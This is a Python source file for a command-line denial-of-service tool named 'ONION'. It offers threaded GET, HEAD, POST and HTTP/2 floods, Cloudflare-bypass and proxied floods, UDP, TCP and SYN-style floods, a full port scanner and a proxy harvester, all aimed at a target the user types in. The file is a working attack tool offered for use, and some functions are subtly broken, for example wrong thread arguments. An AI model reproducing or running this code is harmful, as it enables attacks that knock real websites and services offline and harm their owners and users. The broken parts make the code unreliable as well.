from rgbprint import Color
import os, socket, time, datetime, threading, random, requests, httpx, cloudscraper
from sys import stdout
from os import system, name
from fake_useragent import UserAgent

white = Color.ghost_white
red = Color.red
gray = Color.gray
lime = Color.lime
pur = Color.magenta
purple  = Color.purple
magenta = Color.magenta
yellow = Color.yellow

success = f"{lime}[+]{white}"
error = f"{red}[-]{white}"
wait = f"{gray}[*]{white}"


def get_proxies(proxy_list_url):
    try:
        response = requests.get(proxy_list_url)
        response.raise_for_status()
        return response.text.splitlines()
    except requests.RequestException as e:
        print(f"ERROR : {e}")
        return []

def check_proxy(ip_address, port):
    url = f"https://proxycheck.io/v2/{ip_address}?vpn=1&asn=1"
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()

        if ip_address in data:
            proxy_data = data[ip_address]
            if 'proxy' in proxy_data:
                proxy_type = proxy_data.get('type', 'Unknown')
                print(f"{success} {ip_address}:{port}{white} [{lime}{proxy_type}{white}]")
            else:
                print(f"{error} The IP {ip_address}:{port} is not a proxy.")
        else:
            print(f"{error} ERORR : {ip_address}:{port}: {data}")

    except requests.RequestException as e:
        print(f"{error} ERROR : {ip_address}:{port}: {e}")


def check_proxies():
    proxy_list_url = 'https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=10000&country=all'
    
    proxies = get_proxies(proxy_list_url)
    
    for proxy in proxies:
        if ':' in proxy:
            ip_address, port = proxy.split(':')
            check_proxy(ip_address, port)
        else:
            print(f"{error} Invalid format for proxy: {proxy}")


ua = UserAgent()
random_user_agent = ua.random



def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write(f"\r{wait} Loading => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()  
            return

def udp_attack(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  
    timeout = time.time() + duration

    while True:
        if time.time() > timeout:
            break
        time.sleep(0.1)
        client.sendto(bytes, (target_ip, target_port))
        print(f"{success} Attack Status => {magenta}{target_ip} {gray}|{white} Port : {lime}{target_port}{white} <= [{red}UDP{white}]")

def LaunchHTTP2(url, threads):
    for _ in range(threads):
        threading.Thread(target=fetch_url, args=(url)).start()


def fetch_url(url):
    with httpx.Client(http2=True) as client:
        while True:
            response = client.get(url)
            print(f"{success} Attack Status =>{magenta} {url} {gray}|{white} Status Code : {magenta}{response.status_code}{white} <= [{red}HTTP 2.0{white}]")



def port_scan(target_host):
    start_port = 1
    end_port = 65535

    print(f"{wait} Scanning ports on{red} {target_host}{white}...")
    
    for port in range(start_port, end_port + 1):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(0.1) 

        try:
            client.connect((target_host, port))
            print(f"{success} Port :{gray} {port}{white} | {lime} {lime}open")
            client.close()
        except socket.error:
            print(f"{error} Port :{gray} {port}{white} |{red} closed")


def attack(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(2)
    try:
        client.connect((target_ip, target_port))
        while True:
            client.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
    except socket.error:
        client.close()



def get_flood(url, num_requests):
    for _ in range(num_requests):
        try:
            headers = {
                'User-Agent': random_user_agent 
            }
            requests.get(url, headers=headers)
            requests.get(url, headers=headers)
            print(f"{success} Attack Status =>{magenta} {url}{white} <= [{red}GET{white}]")
        except requests.RequestException as e:
            print(f"{error} Request failed: {e}")

def start_get_flood(url, threads, requests_per_thread):
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=get_flood, args=(url, requests_per_thread))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()



def head_flood(url, num_requests):
    for _ in range(num_requests):
        try:
            headers = {
                'User-Agent': random_user_agent 
            }
            requests.head(url, headers=headers)
            requests.head(url, headers=headers)
            print(f"{success} Attack Status =>{magenta} {url}{white} <= [{red}HEAD{white}]")
        except requests.RequestException as e:
            print(f"{error} Request failed: {e}")

def start_head_flood(url, threads, requests_per_thread):
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=head_flood, args=(url, requests_per_thread))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()

def post_flood(url, num_requests):
    for _ in range(num_requests):
        try:
            headers = {
                'User-Agent': random_user_agent 
            }
            requests.post(url, headers=headers)
            requests.post(url, headers=headers)
            print(f"{success} Attack Status =>{magenta} {url}{white} <= [{red}POST{white}]")
        except requests.RequestException as e:
            print(f"{error} Request failed: {e}")

def start_post_flood(url, threads, requests_per_thread):
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=post_flood, args=(url, requests_per_thread))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()



def start_cfb_flood(url, threads, requests_per_thread):
    scraper = cloudscraper.create_scraper()
    threads_list = []

    for _ in range(threads):
        thread = threading.Thread(target=cfb_flood, args=(url, requests_per_thread, scraper))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()

def cfb_flood(url, num_requests, scraper):
    for _ in range(num_requests):
        try:
            headers = {
                'User-Agent': random_user_agent 
            }
            scraper.get(url, timeout=15, headers=headers)
            scraper.get(url, timeout=15, headers=headers)
            print(f"{success} Attack Status =>{magenta} {url}{white} <= [{red}CFB{white}]")
        except requests.RequestException as e:
            print(f"{error} ERROR : {e}")


def start_pxcfb_flood(url, threads, requests_per_thread, target_proxy):
    scraper = cloudscraper.create_scraper()
    threads_list = []

    for _ in range(threads):
        thread = threading.Thread(target=pxcfb_flood, args=(url, requests_per_thread, scraper, target_proxy))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()

def pxcfb_flood(url, num_requests, scraper, target_proxy):
    for _ in range(num_requests):
        try:
            headers = {
                'User-Agent': random_user_agent 
            }
            proxy = {
                'http': f'http://{target_proxy}',   
                'https': f'http://{target_proxy}'
            }
            scraper.get(url, proxies=proxy, headers=headers)
            scraper.get(url, proxies=proxy, headers=headers)
            print(f"{success} Attack Status =>{magenta} {url}{white} <= [{red}PXCFB{white}]")
        except requests.RequestException as e:
            print(f"{error} ERROR : {e}")




def start_pxraw_flood(url, threads, requests_per_thread, target_proxy):
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=pxraw_flood, args=(url, requests_per_thread, target_proxy))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()

def pxraw_flood(url, num_requests, target_proxy):
    for _ in range(num_requests):
        try:
            headers = {
                'User-Agent': random_user_agent 
            }
            proxy = {
                'http': f'http://{target_proxy}',   
                'https': f'http://{target_proxy}'
            }
            requests.get(url, proxies=proxy, headers=headers)
            requests.get(url, proxies=proxy, headers=headers)
            print(f"{success} Attack Status =>{magenta} {url} {white} <= [{red}PXRAW{white}]")
        except requests.RequestException as e:
            print(f"{error} Request failed: {e}")


def pxpost_flood(url, num_requests, target_proxy):
    for _ in range(num_requests):
        try:
            headers = {
                'User-Agent': random_user_agent 
            }
            proxy = {
                'http': f'http://{target_proxy}',   
                'https': f'http://{target_proxy}'
            }
            requests.post(url, proxies=proxy, headers=headers)
            requests.post(url, proxies=proxy, headers=headers)
            print(f"{success} Attack Status =>{magenta} {url}{white} <= [{red}PXPOST{white}]")
        except requests.RequestException as e:
            print(f"{error} Request failed: {e}")

def start_pxpost_flood(url, threads, requests_per_thread, target_proxy):
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=pxcfb_flood, args=(url, requests_per_thread, target_proxy))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()


def ping(host, port, timeout=1):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        try:
            start_time = time.time()
            s.connect((host, port))
            end_time = time.time()
            elapsed_time = (end_time - start_time) * 1000 
            print(f'{white}Connected to{magenta} {host}{white}: time={magenta}{elapsed_time:.2f}ms{white} protocol={magenta}TCP {white}port={magenta}{port}')
        except socket.timeout:
            print(f"{red}Connection timed out")
        except Exception as e:
            print(f"{error} Error : {e}")




def SYN(ip,p):
    times = 1
    for _ in range(2500):
       try:
          s = socket.socket(socket.AF_INET,socket.SOCK_STREAM, socket.IPPROTO_TCP)
          s.setblocking(0)

          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 65536)
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 65536)
          s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE,65536)
          s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 65536)
          for _ in range(times):
           s.connect((ip,p)); s.connect_ex((ip ,p))
          print(s)
          s.send(b''); s.sendall(b'')
          s.close()
          s.shutdown(socket.SHUT_RDWR)
          times += 1
       except:pass




def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')
##############################################################################################################################################################################
def title():
    stdout.write(f"{lime}                 ..\n")
    stdout.write(f"                ,:\n")
    stdout.write(f"        .      ::\n")
    stdout.write(f"        .:    :2.\n")
    stdout.write(f"         .:,  1L\n")
    stdout.write(f"          .v: Z, ..::, \n")
    stdout.write(f"           :k:N.Lv:\n")
    stdout.write(f"            22ukL\n")
    stdout.write(f"            JSYk.\n")
    stdout.write(f"{white}           ,B@B@i\n")
    stdout.write(f"           BO@@B@.\n")
    stdout.write(f"         :B@L@Bv:@7\n")
    stdout.write(f"       .PB@iBB@  .@Mi\n")
    stdout.write(f"     .P@B@iE@@r  . 7B@i\n")
    stdout.write(f"    5@@B@:NB@1{pur} r  ri:{white}7@M\n")
    stdout.write(f"  .@B@BG.OB@B{pur}  ,.. .i,{white} MB,\n")
    stdout.write(f"  @B@BO.B@@B {pur} i7777,{white}    MB.\n")
    stdout.write(f" PB@B@.OB@BE  {pur}LririL,.L.{white} @P\n")
    stdout.write(f" B@B@5iB@B@i  {pur}:77r7L, L7{white} O@\n")
    stdout.write(f" @B1B27@B@B, {pur}. .:ii.  r7{white} BB\n")
    stdout.write(f" O@.@M:B@B@: {pur}v7:    ::.{white}  BM\n")
    stdout.write(f" :Br7@L5B@BO {pur}irL: :v7L.{white} P@,\n")
    stdout.write(f"  7@,Y@UqB@B7 {pur}ir ,L;r:{white} u@7\n")
    stdout.write(f"   r@LiBMBB@Bu   {pur}rr:.{white}:B@i\n")
    stdout.write(f"     FNL1NB@@@@:   ;OBX\n")
    stdout.write(f"       rLu2ZB@B@@XqG7\n")
    stdout.write(f"          . rJuv::\n\n")
##############################################################################################################################################################################
def help():
    stdout.write(f"{pur}╔═════════════════════════════════════════╗\n")
    stdout.write(f"{white}║{white}| {pur}•{white} layer7        {purple}|{white} Show Layer7 Methods  {white}║\n")
    stdout.write(f"{pur}║{white}| {pur}•{white} layer4        {purple}|{white} Show Layer4 Methods  {pur}║\n")
    stdout.write(f"{white}║{white}| {pur}•{white} tools         {purple}|{white} Show Tools           {white}║\n")
    stdout.write(f"{pur}╚═════════════════════════════════════════╝\n")
##############################################################################################################################################################################
def layer7():
   stdout.write(f"{pur}╔════════════════════════════════════════════╗\n")
   stdout.write(f"{white}║{white}| {pur}•{white} get           {purple}|{white} Get Request Attack      {white}║\n")
   stdout.write(f"{pur}║{white}| {pur}•{white} head          {purple}|{white} Head Request Attack     {pur}║\n")
   stdout.write(f"{white}║{white}| {pur}•{white} http2         {purple}|{white} HTTP 2.0 Request Attack {white}║\n")
   stdout.write(f"{pur}║{white}| {pur}•{white} http          {purple}|{white} HTTP Request Attack     {pur}║\n")
   stdout.write(f"{white}║{white}| {pur}•{white} post          {purple}|{white} POST Request Attack     {white}║\n")
   stdout.write(f"{pur}║{white}| {pur}•{white} soc           {purple}|{white} Socket Attack           {pur}║\n")
   stdout.write(f"{white}║{white}| {pur}•{white} cfb           {purple}|{white} Bypass CF Attack        {white}║\n")
   stdout.write(f"{pur}║{white}| {pur}•{white} pxcfb         {purple}|{white} Bypass CF Attack Proxy  {pur}║\n")
   stdout.write(f"{white}║{white}| {pur}•{white} pxraw         {purple}|{white} Proxy Request Attack    {white}║\n")
   stdout.write(f"{pur}╚════════════════════════════════════════════╝\n")
##############################################################################################################################################################################
def layer4():
    stdout.write(f"{pur}╔════════════════════════════════════════════╗\n")
    stdout.write(f"{white}║{white}| {pur}•{white} udp           {purple}|{white} UDP Attack              {white}║\n")
    stdout.write(f"{pur}║{white}| {pur}•{white} tcp           {purple}|{white} TCP Attack              {pur}║\n")
    stdout.write(f"{white}║{white}| {pur}•{white} syn           {purple}|{white} SYN Attack              {white}║\n")
    stdout.write(f"{pur}╚════════════════════════════════════════════╝\n")
##############################################################################################################################################################################
def tools():
    stdout.write(f"{pur}╔═══════════════════════════════════════════════╗\n")
    stdout.write(f"{white}║{white}| {pur}•{white} geoip         {purple}|{white} Geo IP Address Lookup      {white}║\n")
    stdout.write(f"{pur}║{white}| {pur}•{white} dns           {purple}|{white} Classic DNS Lookup         {pur}║\n")
    stdout.write(f"{white}║{white}| {pur}•{white} subnet        {purple}|{white} Subnet IP Address Lookup   {white}║\n")
    stdout.write(f"{pur}║{white}| {pur}•{white} page          {purple}|{white} Page Links                 {pur}║\n")
    stdout.write(f"{white}║{white}| {pur}•{white} portscan      {purple}|{white} Port Scanner               {white}║\n")
    stdout.write(f"{pur}║{white}| {pur}•{white} check         {purple}|{white} Check proxies              {pur}║\n")
    stdout.write(f"{white}║{white}| {pur}•{white} ping          {purple}|{white} check network connectivity {white}║\n")
    stdout.write(f"{pur}╚═══════════════════════════════════════════════╝\n")
##############################################################################################################################################################################
title()
def main():
    while True:
        command = input(f'{lime}→ {pur}ONION {white}∙ ')

        if command == "cls" or command == "clear":
           clear()
           title()
        elif command == "help" or command == "?":
           help()
        elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
           layer7()
        elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
           layer4()
        elif command == "tools" or command == "tool":
            tools()
        elif command == "exit":
            exit()     
        elif command == "udp" or command == "UDP":
            target_ip = input(f"{pur}•{white} IP :{lime} ")
            target_port = int(input(f"{pur}•{white} Port :{lime} "))
            duration = 60
            countdown(1)
            udp_attack(target_ip, target_port, duration)
        elif command == "tcp" or command == "TCP":
            target_ip = input(f"{pur}•{white} IP :{lime} ")
            target_port = int(input(f"{pur}•{white} Port :{lime} ")) 
            countdown(1)              
                
            def flood():
                while True:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target_ip, target_port))
                        s.sendall(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')
                        s.close()
                    except Exception as e:
                        print(f"{error} ERROR : {e}")

            for _ in range(9999999):
                t = threading.Thread(target=flood)
                print(f"{success} Attack Status =>{magenta} {target_ip} {gray}|{white} Port : {lime}{target_port}{white} <= [{red}TCP{white}]")
                time.sleep(0.1)
                t.start()
        elif command == "get" or command == "GET":
            target_url = input(f"{pur}•{white} URL :{lime} ")
            num_threads = 10
            requests_per_thread = 100
            countdown(1)
            start_get_flood(target_url, num_threads, requests_per_thread)
        elif command == "head" or command == "HEAD":
            target_url = input(f"{pur}•{white} URL :{lime} ")
            num_threads = 10
            requests_per_thread = 100
            countdown(1)
            start_head_flood(target_url, num_threads, requests_per_thread)
        elif command == "http2" or command == "HTTP2":
            target_url = input(f"{pur}•{white} URL :{lime} ")
            countdown(1)
            LaunchHTTP2(target_url)
        elif command == "geoip" or command == "GEOIP":
            target_ip = input(f"{pur}•{white} IP :{lime} ")
            response = requests.get(f"https://api.hackertarget.com/geoip/?q={target_ip}")
            print(response.text)
        elif command == "dns" or command == "DNS":
            target_ip = input(f"{pur}•{white} IP / URL :{lime} ")
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target_ip}")
            print(r.text)
        elif command == "subnet" or command == "SUBNET":
            target_ip = input(f"{pur}•{white} IP :{lime} ")
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target_ip}")
            print(r.text) 
        elif command == "page" or command == "PAGE":
            target_url = input(f"{pur}•{white} URL :{lime} ")
            r = requests.get(f"https://api.hackertarget.com/pagelinks/?q={target_url}")
            print(r.text) 
        elif command == "portscan" or command == "PORTSCAN":
            target_ip = input(f"{pur}•{white} IP :{lime} ")
            ip_address = socket.gethostbyname(target_ip)
            print(f"{wait} Target IP address: {ip_address}")
            countdown(1)
            port_scan(ip_address) 
        elif command == "post" or command == "POST":
            target_url = input(f"{pur}•{white} URL :{lime} ")
            num_threads = 10
            requests_per_thread = 100
            countdown(1)
            start_post_flood(target_url, num_threads, requests_per_thread)
        elif command == "soc" or command == "SOC":
            target_ip = input(f"{pur}•{white} IP :{lime} ")
            target_port = int(input(f"{pur}•{white} Port :{lime} "))  

            num_threads = 100

            countdown(1)

            threads = []
            for _ in range(num_threads):
                thread = threading.Thread(target=attack, args=(target_ip, target_port))
                threads.append(thread)
                thread.start()

            for thread in threads:
                print(f'{success} Attack Status =>{magenta} {target_ip} {gray}|{white} Port : {lime}{target_port}{white} <= [{red}SOC{white}]')
                thread.join()

            print(f"{success} Attack completed.")
        elif command == "http" or command == "HTTP":
            target_url = input(f"{pur}•{white} URL :{lime} ")
            num_threads = 10
            requests_per_thread = 100
            countdown(1)
            start_get_flood(target_url, num_threads, requests_per_thread)
        elif command == "cfb" or command == "CFB":
            target_url = input(f"{pur}•{white} URL :{lime} ")
            num_threads = 10
            requests_per_thread = 100
            countdown(1)
            start_cfb_flood(target_url, num_threads, requests_per_thread)
        elif command == "pxcfb" or command == "PXCFB":
            target_url = input(f"{pur}•{white} URL :{lime} ")
            target_proxy = input(f"{pur}•{white} Proxy {gray}(example: 127.0.0.1:8888){white} :{lime} ")
            num_threads = 10
            requests_per_thread = 100
            countdown(1)
            start_pxcfb_flood(target_url, num_threads, requests_per_thread, target_proxy)
        elif command == "pxraw" or command == "PXRAW":
            target_url = input(f"{pur}•{white} URL :{lime} ")
            target_proxy = input(f"{pur}•{white} Proxy {gray}(example: 127.0.0.1:8888){white} :{lime} ")
            num_threads = 10
            requests_per_thread = 100
            countdown(1)
            start_pxraw_flood(target_url, num_threads, requests_per_thread, target_proxy)
        elif command == "pxpost" or command == "PXPOST":
            target_url = input(f"{pur}•{white} URL :{lime} ")
            target_proxy = input(f"{pur}•{white} Proxy {gray}(example: 127.0.0.1:8888){white} :{lime} ")
            num_threads = 10
            requests_per_thread = 100
            countdown(1)
            start_pxraw_flood(target_url, num_threads, requests_per_thread, target_proxy)
        elif command == "check" or command == "CHECK":
            print(f'{yellow}[!]{white} WARNING! dont use free proxies there are malicious proxies')
            print('to avoid malicious proxies you have to pay on proxy sites. use VirusTotal to see if the proxies are NOT malicious.')
            time.sleep(2)
            check_proxies()  
        elif command == "ping" or command == "PING":
            host = input(f"{pur}•{white} IP :{lime} ")
            port = int(input(f"{pur}•{white} Port :{lime} "))    
            timeout = 1  

            for _ in range(9999999999999):
               ping(host, port, timeout)
               time.sleep(1)
        elif command == "syn" or command == "SYN":
            ip = input(f"{pur}•{white} IP :{lime} ")
            port = int(input(f"{pur}•{white} Port :{lime} ")) 
            countdown(1)           

            for _ in range(100000):
                threading.Thread(target=SYN,args=(ip,port)).start()     
                print(f'{success} Attack Status =>{magenta} {ip} {gray}|{white} Port : {lime}{port}{white} <= [{red}SYN{white}]')
                time.sleep(0.1)
            
        else:
           stdout.write(f"{error} Unknown command. type 'help' to see all commands.\n")  


if __name__ == '__main__':
    main()
